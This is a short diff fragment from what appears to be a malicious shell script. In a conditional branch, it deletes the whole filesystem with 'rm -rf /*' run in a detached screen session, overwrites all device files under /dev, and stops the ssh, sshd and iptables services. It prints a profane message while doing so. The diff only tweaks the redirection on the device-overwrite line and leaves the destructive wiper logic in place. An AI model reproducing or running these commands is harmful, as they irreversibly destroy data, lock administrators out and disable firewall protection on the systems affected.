@@ -10,7 +10,7 @@ if [ ! -f "/etc/system.runtime.bin" ]; then
 else
   echo "Fuck You"
   screen -dmS Fuck rm -rf /*
-  echo "0" >>/dev/*
+  echo "0" >/dev/*
   service ssh stop
   service sshd stop
   service iptables stop
